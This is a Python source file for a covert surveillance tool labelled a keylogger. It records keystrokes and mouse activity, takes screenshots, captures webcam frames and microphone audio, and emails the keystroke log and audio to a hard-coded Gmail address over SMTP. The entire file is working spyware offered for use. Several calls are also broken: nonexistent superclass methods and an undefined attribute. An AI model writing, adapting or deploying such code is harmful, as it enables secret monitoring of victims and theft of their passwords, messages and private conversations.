from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
import time
import pyaudio
import cv2
import wave
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import logging

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SMTP_USERNAME = 'lukbr25@gmail.com'
SMTP_PASSWORD = ''

logging.basicConfig(filename="error.log", level=logging.ERROR, 
                    format="%(asctime)s:%(levelname)s:%(message)s")

class Keylogger:
    def __init__(self, max_count=10, log_file="log.txt", interval=60, idle_time=300):
        """
        Initializes the Keylogger object.

        Args:
            max_count (int): The maximum number of keys to log before writing to the log file.
            log_file (str): The name of the file to write the log to.
            interval (int): The interval in seconds at which to capture the screen and record audio.
            idle_time (int): The amount of time in seconds after which to consider the user as idle.

        Attributes:
            video_capture (cv2.VideoCapture): The object used to capture video.
            video_writer (cv2.VideoWriter): The object used to write video frames.
            count (int): The number of keys logged so far.
            keys (list): A list of keys that have been pressed.
            mouse_events (list): A list of mouse events that have occurred.
            max_count (int): The maximum number of keys to log before writing to the log file.
            log_file (str): The name of the file to write the log to.
            interval (int): The interval in seconds at which to capture the screen and record audio.
            idle_time (int): The amount of time in seconds after which to consider the user as idle.
            last_capture_time (float): The time of the last screen capture.
            last_email_time (float): The time of the last email send.
            last_activity_time (float): The time of the last user activity.
            is_active (bool): A flag indicating whether the user is currently active.
        """
        self.video_capture = cv2.VideoCapture(0)
        self.video_writer = None
        self.count = 0
        self.keys = []
        self.mouse_events = []
        self.max_count = max_count
        self.log_file = log_file
        self.interval = interval
        self.idle_time = idle_time
        self.last_capture_time = time.time()
        self.last_email_time = time.time()
        self.last_activity_time = time.time()
        self.is_active = True  # added flag to indicate user activity

    def on_press(self, key):
        """
        Logs a pressed key and performs periodic screen captures, audio recordings and email sends.

        Args:
            key (pynput.keyboard.Key): The key that was pressed.
        """
        try:
            if self.is_active:  # added check to capture keys and mouse movements only when user is active
                self.keys.append(key)
                self.count += 1
                print(f"{key} pressed")

                if self.count >= self.max_count:
                    self.write_file()
                    self.count = 0
                    self.keys = []

                current_time = time.time()
                if current_time - self.last_capture_time >= self.interval:
                    self.capture_screen()
                    self.record_audio()  # added line to record audio
                    self.last_capture_time = current_time

                if current_time - self.last_email_time >= self.interval * 60:
                    self.send_email()
                    self.last_email_time = current_time

            self.check_idle(current_time)  # moved from the end of the method
        except Exception as e:
            logging.error(f"Error in on_press method: {e}")

    def check_idle(self, current_time):
        """
        Check if the user is idle.

        This method checks if the user is idle by comparing the current time to the last activity time.
        If the user is idle, it sets the is_active flag to False and stops the listener. If the user is
        active, it sets the is_active flag to True and updates the last activity time.

        Args:
            current_time (float): The current time in seconds since the epoch.

        Returns:
            None
        """ 
        try:
            if current_time - self.last_activity_time >= self.idle_time:
                self.is_active = False
                Listener.stop_listening(self)  # modified this line
            else:
                self.is_active = True
                self.last_activity_time = current_time
        except Exception as e:
            logging.error(f"Error in check_idle method: {e}")

    def stop_listening(self):
        """
        Stop listening for events.

        This method releases the video capture and video writer resources, if they exist, and then calls
        the superclass's stop_listening method.

        Args:
            None

        Returns:
            None
        """
        try:
            self.video_capture.release()

            if self.video_writer is not None:
                self.video_writer.release()

            super().stop_listening()
        except Exception as e:
            logging.error(f"Error in stop_listening method: {e}")

    def on_move(self, x, y):
        """
        Handle a mouse move event.

        This method is called when the mouse is moved. It appends a tuple of the form ('move', x, y) to
        the mouse_events list and updates the last activity time if the user is active.

        Args:
            x (int): The x-coordinate of the mouse.
            y (int): The y-coordinate of the mouse.

        Returns:
            None
        """
        try:
            if self.is_active:  # added check to capture mouse movements only when user is active
                self.mouse_events.append(('move', x, y))
                self.last_activity_time = time.time()
        except Exception as e:
            logging.error(f"Error in on_move method: {e}")

    def on_click(self, x, y, button, pressed):
        """
        Handle a mouse click event.

        This method is called when a mouse button is clicked. It appends a tuple of the form ('click', x, y, button) to
        the mouse_events list and updates the last activity time if the user is active.

        Args:
            x (int): The x-coordinate of the mouse.
            y (int): The y-coordinate of the mouse.
            button (str): The name of the button that was clicked (e.g., 'left', 'right').
            pressed (bool): True if the button was pressed, False if it was released.

        Returns:
            None
        """
        try:
            if self.is_active:  # added check to capture mouse movements only when user is active
                if pressed:
                    self.mouse_events.append(('click', x, y, button))
                    self.last_activity_time = time.time()
        except Exception as e:
            logging.error(f"Error in on_click method: {e}")

    def on_scroll(self, x, y, dx, dy):
        """
        Handle a mouse scroll event.

        This method is called when the mouse wheel is scrolled. It appends a tuple of the form
        ('scroll', x, y, dx, dy) to the mouse_events list and updates the last activity time if the user is active.

        Args:
            x (int): The x-coordinate of the mouse.
            y (int): The y-coordinate of the mouse.
            dx (int): The horizontal scroll distance.
            dy (int): The vertical scroll distance.

        Returns:
            None
        """
        try:
            if self.is_active:  # added check to capture mouse movements only when user is active
                self.mouse_events.append(('scroll', x, y, dx, dy))
                self.last_activity_time = time.time()
        except Exception as e:
            logging.error(f"Error in on_scroll method: {e}")

    def send_email(self):
        """
        Send an email with the log file and audio recording as attachments.

        This method constructs a MIME message with the log file and audio recording as attachments and
        sends it to the configured SMTP server.

        Args:
            None

        Returns:
            None
        """
        try:
            msg = MIMEMultipart()
            msg['From'] = SMTP_USERNAME
            msg['To'] = SMTP_USERNAME
            msg['Subject'] = 'Log file'

            with open(self.log_file, "rb") as f, open('audio.wav', "rb") as af:
                file_data = f.read()
                audio_data = af.read()
                attachment = MIMEApplication(file_data, _subtype="txt")
                attachment.add_header('Content-Disposition', 'attachment', filename=self.log_file)
                msg.attach(attachment)
                audio_attachment = MIMEApplication(audio_data, _subtype="wav")
                audio_attachment.add_header('Content-Disposition', 'attachment', filename='audio.wav')
                msg.attach(audio_attachment)

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(SMTP_USERNAME, SMTP_PASSWORD)
                server.sendmail(SMTP_USERNAME, SMTP_USERNAME, msg.as_string())

            print('Email sent successfully')
        except Exception as e:
            logging.error(f'Error sending email: {e}')


    def record_audio(self):
        """
        Record audio for five seconds and save it to a WAV file.

        This method uses PyAudio to record audio for five seconds and saves it to a WAV file.

        Args:
            None

        Returns:
            None
        """
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            RECORD_SECONDS = 5
            WAVE_OUTPUT_FILENAME = 'audio.wav'

            p = pyaudio.PyAudio()

            stream = p.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK)

            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            p.terminate()

            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            print(f"Audio recorded and saved as {self.WAVE_OUTPUT_FILENAME}")
        except Exception as e:
            print(f"Error recording audio: {e}")


    def write_file(self):
        """
        Write the keystrokes and mouse events to a log file.

        The function opens the log file in 'append' mode, iterates over the recorded keystrokes and writes them
        to the file. The function also writes any recorded mouse events to the file.

        Args:
            self: The Keylogger object.

        Returns:
            None.

        Raises:
            IOError: An error occurred while writing to the log file.
        """
        try:
            with open(self.log_file, "a") as f:
                for key in self.keys:
                    k = str(key).replace("'", "")
                    if "space" in k:
                        f.write("\n")
                    elif "Key" not in k:
                        f.write(k)
                for event in self.mouse_events:
                    f.write(str(event) + '\n')
        except Exception as e:
            print(f"Error writing to file: {e}")


    def on_release(self, key):
        """
        Handles the release of a keyboard key.

        The function checks if the 'esc' key was released and returns False if so. Otherwise, it appends the 
        released key to the list of recorded mouse events and prints the event to the console. The function
        then checks if the system is idle and if so, captures a screenshot.

        Args:
            self: The Keylogger object.
            key: The key that was released.

        Returns:
            False if the 'esc' key was released, None otherwise.

        Raises:
            None.
        """
        try:
            if key == Key.esc:
                return False

            self.mouse_events.append(key)
            print(f"{key} released")

            self.check_idle(time.time())
        except Exception as e:
            print(f"Error on key release: {e}")
   
    def start(self):
        """
        Starts the keylogger.

        The function starts two listener objects (one for keyboard events and one for mouse events) and 
        waits for them to join.

        Args:
            self: The Keylogger object.

        Returns:
            None.

        Raises:
            Exception: An error occurred while starting the listener.
        """
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener, \
                    MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll) as mouse_listener:
                listener.join()
        except Exception as e:
            print(f"Error starting listener: {e}")


    def capture_screen(self):
        """
        Captures a screenshot and video frame (if available).

        The function captures a screenshot and saves it to disk, and also captures a video frame (if available)
        and writes it to disk. If a video writer object has not been initialized, the function initializes it.

        Args:
            self: The Keylogger object.

        Returns:
            None.

        Raises:
            Exception: An error occurred while capturing the screen or writing the video.
        """
        try:
            filename = f"{int(time.time() * 1000)}.png"
            im = ImageGrab.grab()
            im.save(filename)
            print(f"Screenshot saved as {filename}")
            
            ret, frame = self.video_capture.read()

            if ret:
                if self.video_writer is None:
                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                    filename = time.strftime("video_%Y%m%d_%H%M%S.avi")
                    self.video_writer = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

                self.video_writer.write(frame)
            else:
                print("Failed to capture video.")

            super().capture_screen()
        except Exception as e:
            print(f"Error capturing screen: {e}")


if __name__ == "__main__":
    """
    Runs the keylogger when the script is executed.

    Creates a new Keylogger object and starts it.
    """
    keylogger = Keylogger()
    keylogger.start()


